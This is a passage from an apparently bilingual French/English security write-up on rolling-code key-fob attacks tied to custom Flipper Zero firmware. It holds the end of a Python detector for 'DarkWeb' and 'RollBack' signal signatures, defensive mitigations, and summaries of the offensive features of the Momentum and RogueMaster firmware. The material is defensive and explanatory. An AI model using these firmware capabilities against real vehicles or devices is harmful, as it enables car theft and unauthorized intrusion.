        <span class="k">return</span> <span class="p">{</span><span class="s1">&#39;power&#39;</span><span class="p">:</span> <span class="n">power</span><span class="p">,</span> <span class="s1">&#39;peak_freq&#39;</span><span class="p">:</span> <span class="n">peak_freq</span><span class="p">,</span> <span class="s1">&#39;psd_shape&#39;</span><span class="p">:</span> <span class="n">psd</span><span class="p">[:</span><span class="mi">1024</span><span class="p">]}</span>

    <span class="k">def</span> <span class="nf">detect_anomalies</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="n">current</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">sdr</span><span class="o">.</span><span class="n">read_samples</span><span class="p">(</span><span class="mi">256</span><span class="o">*</span><span class="mi">1024</span><span class="p">)</span>
        <span class="n">features</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">analyze_signal_features</span><span class="p">(</span><span class="n">current</span><span class="p">)</span>

        <span class="c1"># Detect DarkWeb-specific signatures</span>
        <span class="k">if</span> <span class="bp">self</span><span class="o">.</span><span class="n">is_darkweb_signature</span><span class="p">(</span><span class="n">features</span><span class="p">):</span>
            <span class="k">return</span> <span class="s2">&quot;ALERT: DarkWeb signature detected!&quot;</span>

        <span class="c1"># Detect RollBack attempts</span>
        <span class="k">if</span> <span class="bp">self</span><span class="o">.</span><span class="n">is_rollback_attempt</span><span class="p">(</span><span class="n">current</span><span class="p">):</span>
            <span class="k">return</span> <span class="s2">&quot;ALERT: RollBack attack attempt in progress!&quot;</span>

        <span class="k">return</span> <span class="s2">&quot;No anomaly detected&quot;</span>

    <span class="k">def</span> <span class="nf">is_darkweb_signature</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">features</span><span class="p">):</span>
        <span class="c1"># Implementation of DarkWeb detection rules</span>
        <span class="n">power_anomaly</span> <span class="o">=</span> <span class="n">features</span><span class="p">[</span><span class="s1">&#39;power&#39;</span><span class="p">]</span> <span class="o">&gt;</span> <span class="bp">self</span><span class="o">.</span><span class="n">baseline</span><span class="p">[</span><span class="s1">&#39;power&#39;</span><span class="p">]</span> <span class="o">*</span> <span class="mf">1.5</span>
        <span class="n">freq_shift</span> <span class="o">=</span> <span class="nb">abs</span><span class="p">(</span><span class="n">features</span><span class="p">[</span><span class="s1">&#39;peak_freq&#39;</span><span class="p">]</span> <span class="o">-</span> <span class="bp">self</span><span class="o">.</span><span class="n">baseline</span><span class="p">[</span><span class="s1">&#39;peak_freq&#39;</span><span class="p">])</span> <span class="o">&gt;</span> <span class="mi">20</span>
        <span class="k">return</span> <span class="n">power_anomaly</span> <span class="ow">and</span> <span class="n">freq_shift</span>

    <span class="k">def</span> <span class="nf">is_rollback_attempt</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">samples</span><span class="p">):</span>
        <span class="c1"># Detect fast pulses characteristic of a RollBack attack</span>
        <span class="n">edges</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">diff</span><span class="p">(</span><span class="n">np</span><span class="o">.</span><span class="n">abs</span><span class="p">(</span><span class="n">samples</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">np</span><span class="o">.</span><span class="n">mean</span><span class="p">(</span><span class="n">np</span><span class="o">.</span><span class="n">abs</span><span class="p">(</span><span class="n">samples</span><span class="p">))</span> <span class="o">*</span> <span class="mf">1.5</span><span class="p">)</span>
        <span class="n">edge_count</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">sum</span><span class="p">(</span><span class="n">edges</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span>
        <span class="n">timing</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">analyze_pulse_timing</span><span class="p">(</span><span class="n">edges</span><span class="p">)</span>

        <span class="k">return</span> <span class="n">edge_count</span> <span class="o">&gt;</span> <span class="mi">30</span> <span class="ow">and</span> <span class="bp">self</span><span class="o">.</span><span class="n">has_suspicious_pattern</span><span class="p">(</span><span class="n">timing</span><span class="p">)</span>

    <span class="k">def</span> <span class="nf">has_suspicious_pattern</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">timing</span><span class="p">):</span>
        <span class="c1"># Check for suspicious repetition patterns (4-7-4 pattern)</span>
        <span class="n">pattern</span> <span class="o">=</span> <span class="p">[</span><span class="mi">4</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">4</span><span class="p">]</span>  <span class="c1"># Characteristic RollBack pattern</span>
        <span class="c1"># Implementation of pattern matching algorithm</span>
        <span class="k">return</span> <span class="n">pattern_match_score</span><span class="p">(</span><span class="n">timing</span><span class="p">,</span> <span class="n">pattern</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mf">0.8</span>

<span class="c1"># Usage</span>
<span class="n">monitor</span> <span class="o">=</span> <span class="n">RollingCodeMonitor</span><span class="p">(</span><span class="n">freq</span><span class="o">=</span><span class="mf">433.92e6</span><span class="p">)</span>
<span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
    <span class="n">result</span> <span class="o">=</span> <span class="n">monitor</span><span class="o">.</span><span class="n">detect_anomalies</span><span class="p">()</span>
    <span class="k">if</span> <span class="s2">&quot;ALERT&quot;</span> <span class="ow">in</span> <span class="n">result</span><span class="p">:</span>
        <span class="n">send_notification</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>
    <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.5</span><span class="p">)</span>
</code></pre></div>

<h4 id="recommandations-blue-team-pour-la-mitigation">üîµ Recommandations Blue Team pour la mitigation</h4>
<h3 id="blue-team-mitigation-recommendations">Blue Team Mitigation Recommendations</h3>
<p><strong>Fran√ßais :</strong></p>
<ol>
<li><strong>Mise √† jour des syst√®mes de s√©curit√©</strong> - Recommander des mises √† niveau pour les syst√®mes vuln√©rables :</li>
<li>Conversion vers des syst√®mes √† code dynamique √† haute entropie</li>
<li>Migration vers des syst√®mes √† authentification multifacteur (cl√© physique + code)</li>
<li>
<p>Impl√©mentation de syst√®mes d'authentification biom√©trique compl√©mentaires</p>
</li>
<li>
<p><strong>Zones s√©curis√©es RF</strong> - √âtablir des p√©rim√®tres prot√©g√©s :</p>
</li>
<li>Installation de cages de Faraday dans les zones sensibles de stationnement</li>
<li>Utilisation de brouilleurs RF cibl√©s l√©gaux (dans le cadre r√©glementaire)</li>
<li>
<p>D√©ploiement de capteurs RF connect√©s au syst√®me d'alarme</p>
</li>
<li>
<p><strong>Formation et sensibilisation</strong> - Former les √©quipes de s√©curit√© et les utilisateurs :</p>
</li>
<li>Programmes de sensibilisation sur les risques li√©s aux t√©l√©commandes automobiles</li>
<li>Proc√©dures d'alerte en cas de suspicion d'attaque</li>
<li>M√©thodes de v√©rification de l'int√©grit√© des syst√®mes d'acc√®s</li>
</ol>
<p><strong>English :</strong></p>
<ol>
<li><strong>Security System Updates</strong> - Recommend upgrades for vulnerable systems:</li>
<li>Conversion to high-entropy dynamic code systems</li>
<li>Migration to multi-factor authentication systems (physical key + code)</li>
<li>
<p>Implementation of complementary biometric authentication systems</p>
</li>
<li>
<p><strong>RF Secure Zones</strong> - Establish protected perimeters:</p>
</li>
<li>Installation of Faraday cages in sensitive parking areas</li>
<li>Use of legal targeted RF jammers (within regulatory framework)</li>
<li>
<p>Deployment of RF sensors connected to the alarm system</p>
</li>
<li>
<p><strong>Training and Awareness</strong> - Train security teams and users:</p>
</li>
<li>Awareness programs on risks related to automotive remote controls</li>
<li>Alert procedures in case of suspected attack</li>
<li>Methods for verifying the integrity of access systems</li>
</ol>
<h4 id="recommandations-de-securite-supplementaires">üîµ Recommandations de s√©curit√© suppl√©mentaires</h4>
<h3 id="additional-security-recommendations">Additional Security Recommendations</h3>
<p><strong>Fran√ßais :</strong></p>
<ol>
<li><strong>D√©veloppement d'une base de donn√©es de signatures</strong> - Cr√©er un r√©f√©rentiel des signatures d'attaques :</li>
<li>Cataloguer les motifs de signaux par firmware malicieux</li>
<li>Partager les signatures entre les √©quipes de s√©curit√© et constructeurs</li>
<li>
<p>Impl√©menter un syst√®me de mise √† jour automatique des signatures</p>
</li>
<li>
<p><strong>R√©ponse aux incidents standardis√©e</strong> - √âtablir des proc√©dures :</p>
</li>
<li>Isolation imm√©diate des v√©hicules potentiellement compromis</li>
<li>R√©initialisation s√©curis√©e des syst√®mes de cl√©s par un professionnel</li>
<li>Analyse forensique des signaux captur√©s et journalisation des incidents</li>
</ol>
<p><strong>English :</strong></p>
<ol>
<li><strong>Signature Database Development</strong> - Create a repository of attack signatures:</li>
<li>Catalog signal patterns by malicious firmware</li>
<li>Share signatures between security teams and manufacturers</li>
<li>
<p>Implement an automatic signature update system</p>
</li>
<li>
<p><strong>Standardized Incident Response</strong> - Establish procedures:</p>
</li>
<li>Immediate isolation of potentially compromised vehicles</li>
<li>Secure reset of key systems by a professional</li>
<li>Forensic analysis of captured signals and incident logging</li>
</ol>
<p><strong>Mitigation :</strong></p>
<ol>
<li><strong>S√©curisation des v√©hicules</strong></li>
<li>Utiliser des garages ferm√©s et s√©curis√©s</li>
<li>Installer une protection de signal RF (pouch Faraday pour cl√©s)</li>
<li>
<p>Activer les fonctions de double authentification si disponibles (PIN, biom√©trie)</p>
</li>
<li>
<p><strong>R√©ponse technique</strong></p>
</li>
<li>Mettre √† jour le firmware des t√©l√©commandes si des correctifs sont disponibles</li>
<li>Utiliser des technologies compl√©mentaires (immobiliseur avec transpondeur)</li>
<li>Impl√©menter des syst√®mes d'authentification √† deux facteurs pour les v√©hicules critiques</li>
</ol>
<p><strong>Recommandations √† long terme :</strong></p>
<ol>
<li><strong>Pour les constructeurs automobiles :</strong></li>
<li>Renforcer les algorithmes de codes tournants</li>
<li>Impl√©menter la v√©rification du temps d'√©mission (timestamp) dans le protocole</li>
<li>Ajouter des couches de chiffrement suppl√©mentaires</li>
<li>
<p>D√©ployer des mises √† jour de s√©curit√© par OTA (Over-The-Air)</p>
</li>
<li>
<p><strong>Pour les propri√©taires de v√©hicules affect√©s :</strong></p>
</li>
<li>Contacter le concessionnaire pour v√©rifier la disponibilit√© de mises √† jour de s√©curit√©</li>
<li>Utiliser des protections m√©caniques compl√©mentaires (barre de volant, sabots)</li>
<li>Envisager l'installation d'un syst√®me d'alarme ind√©pendant avec notification</li>
</ol>
<h4 id="analyse-dimpact-et-risque">üìä Analyse d'impact et risque</h4>
<h3 id="impact-analysis-and-risk">Impact Analysis and Risk</h3>
<p>L'exploitation des vuln√©rabilit√©s des codes tournants via le firmware DarkWeb pr√©sente un niveau de risque √©lev√© pour plusieurs raisons :</p>
<ol>
<li>
<p><strong>Facilit√© d'exploitation</strong> - N√©cessite uniquement une capture unique, sans comp√©tences techniques avanc√©es</p>
</li>
<li>
<p><strong>Large surface d'attaque</strong> - Affecte de multiples marques et mod√®les de v√©hicules</p>
</li>
<li>
<p><strong>Persistance</strong> - Pas de solution simple √† court terme (hors rappel massif)</p>
</li>
<li>
<p><strong>Impact financier</strong> - Co√ªt potentiel pour les constructeurs et assurances estim√© √† plusieurs milliards d'euros</p>
</li>
<li>
<p><strong>√âvolutivit√© de la menace</strong> - Le firmware continue d'√™tre d√©velopp√© pour cibler davantage de v√©hicules</p>
</li>
</ol>
<p>Cette vuln√©rabilit√© souligne l'importance d'une approche de s√©curit√© en profondeur dans la conception des syst√®mes automobiles modernes, et la n√©cessit√© d'une collaboration entre chercheurs en s√©curit√©, constructeurs et r√©gulateurs pour adresser ces probl√©matiques.</p>
<h4 id="firmwares-personnalises-pour-flipper-zero">üíø Firmwares Personnalis√©s pour Flipper Zero</h4>
<h3 id="custom-firmwares-for-flipper-zero">Custom Firmwares for Flipper Zero</h3>
<p><strong>Fran√ßais :</strong></p>
<p>En plus du firmware DarkWeb mentionn√© pr√©c√©demment, plusieurs autres firmwares personnalis√©s existent pour le Flipper Zero, chacun avec ses propres capacit√©s et caract√©ristiques. Voici les deux plus populaires :</p>
<p><strong>1. Firmware Momentum</strong></p>
<p>Ce firmware se concentre principalement sur :</p>
<ul>
<li><strong>Personnalisation de l'interface utilisateur</strong> - Th√®mes am√©lior√©s et animations</li>
<li><strong>Tests de s√©curit√© Bluetooth avanc√©s</strong> - Capacit√©s √©tendues pour le BLE spam et les attaques Bluetooth</li>
<li><strong>Fonctionnalit√©s GPS</strong> - Support pour le "wardriving" en enregistrant les coordonn√©es GPS avec les captures WiFi</li>
<li><strong>Gestion de fichiers am√©lior√©e</strong> - Navigation et organisation optimis√©es des captures RF et autres donn√©es</li>
</ul>
<p>Momentum est particuli√®rement utile pour les tests de s√©curit√© Bluetooth et la reconnaissance passive, tout en offrant une interface utilisateur raffin√©e.</p>
<p><strong>2. Firmware RogueMaster</strong></p>
<p>Ce firmware combine des caract√©ristiques des firmwares Unleashed et Xtreme, offrant :</p>
<ul>
<li><strong>Versatilit√© maximale</strong> - Presque toutes les fonctionnalit√©s des autres firmwares r√©unies</li>
<li><strong>Mode interface simplifi√©</strong> - "DUMB mode" pour faciliter l'utilisation des fonctions de base</li>
<li><strong>Am√©liorations BadUSB</strong> - Biblioth√®ques √©tendues de payloads et capacit√©s d'ex√©cution automatique</li>
<li><strong>Modules additionnels</strong> - Plus de protocoles et d√©codeurs RF support√©s</li>
<li><strong>Animations personnalis√©es</strong> - Grands choix d'animations et de visuels pour le Flipper</li>
</ul>
<p><strong>English :</strong></p>
<p>In addition to the previously mentioned DarkWeb firmware, several other custom firmwares exist for the Flipper Zero, each with their own capabilities and features. Here are the two most popular ones:</p>
<p><strong>1. Momentum Firmware</strong></p>
<p>This firmware mainly focuses on:</p>
<ul>
<li><strong>UI customization</strong> - Enhanced themes and animations</li>
<li><strong>Advanced Bluetooth security testing</strong> - Extended capabilities for BLE spam and Bluetooth attacks</li>
<li><strong>GPS features</strong> - Support for wardriving by recording GPS coordinates with WiFi captures</li>
<li><strong>Enhanced file management</strong> - Optimized navigation and organization of RF captures and other data</li>
</ul>
<p>Momentum is particularly useful for Bluetooth security testing and passive reconnaissance, while offering a refined user interface.</p>
<p><strong>2. RogueMaster Firmware</strong></p>
<p>This firmware combines features from Unleashed and Xtreme firmwares, offering:</p>
<ul>
<li><strong>Maximum versatility</strong> - Almost all features from other firmwares combined</li>
<li><strong>Simplified interface mode</strong> - "DUMB mode" for easier use of basic functions</li>
<li><strong>Bad USB enhancements</strong> - Extended libraries of payloads and auto-run capabilities</li>
<li><strong>Additional modules</strong> - More RF protocols and decoders supported</li>
<li><strong>Custom animations</strong> - Large selection of animations and visuals for the Flipper</li>
</ul>
<h4 id="considerations-legales-et-ethiques">‚ö†Ô∏è Consid√©rations L√©gales et √âthiques</h4>
<h3 id="legal-and-ethical-considerations">Legal and Ethical Considerations</h3>
<p><strong>Fran√ßais :</strong></p>
<p>L'utilisation de firmwares personnalis√©s comme DarkWeb, Momentum ou RogueMaster soul√®ve d'importantes questions l√©gales et √©thiques :</p>
<ol>
<li>
<p><strong>Cadre l√©gal</strong> - Dans de nombreux pays, l'interception non autoris√©e de communications sans fil est ill√©gale, m√™me √† des fins de test.</p>
</li>
<li>
<p><strong>Responsabilit√©</strong> - L'utilisation de ces firmwares pour compromettre des syst√®mes automobiles ou autres sans autorisation explicite est ill√©gale et peut entra√Æner des poursuites p√©nales.</p>
</li>
<li>
<p><strong>Divulgation responsable</strong> - Les chercheurs en s√©curit√© d√©couvrant des vuln√©rabilit√©s doivent suivre les protocoles de divulgation responsable aupr√®s des constructeurs concern√©s.</p>
</li>
<li>
<p><strong>Documentation</strong> - Toute utilisation l√©gitime (tests autoris√©s) doit √™tre rigoureusement document√©e, avec autorisations √©crites et journaux d√©taill√©s.</p>
</li>
</ol>
<p><strong>English :</strong></p>
<p>The use of custom firmwares like DarkWeb, Momentum, or RogueMaster raises important legal and ethical questions:</p>
<ol>
<li>
<p><strong>Legal framework</strong> - In many countries, unauthorized interception of wireless communications is illegal, even for testing purposes.</p>
</li>
<li>
<p><strong>Liability</strong> - Using these firmwares to compromise automotive or other systems without explicit authorization is illegal and may result in criminal prosecution.</p>
</li>
<li>
<p><strong>Responsible disclosure</strong> - Security researchers discovering vulnerabilities should follow responsible disclosure protocols with concerned manufacturers.</p>
</li>
<li>
<p><strong>Documentation</strong> - Any legitimate use (authorized testing) must be rigorously documented, with written authorizations and detailed logs.</p>
</li>
</ol>
</body>
</html>